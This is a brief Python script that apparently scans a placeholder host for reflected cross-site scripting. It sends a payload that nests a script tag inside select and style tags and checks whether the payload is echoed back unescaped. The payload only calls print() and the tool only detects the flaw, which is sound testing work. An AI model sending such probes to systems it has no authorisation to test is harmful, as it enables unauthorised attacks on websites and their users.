#!/usr/bin/env python3

import time
import requests


def main():
    target = "http://target:3000"

    for i in range(3):
        print(f"[+] Scanning in {3-i}")
        time.sleep(1)

    if scan(target):
        print(f"[+] Vulnerable target found: {target}")
    else:
        print(f"[+] Target not vulnerable: {target}")


def scan(target: str) -> bool:
    resp = requests.get(
        f"{target}/somewhere/",
        params={"name": "<select><style><script>print()</script></style></select>"},
    )
    return "<select><style><script>print()</script></style></select>" in resp.text


if __name__ == "__main__":
    main()
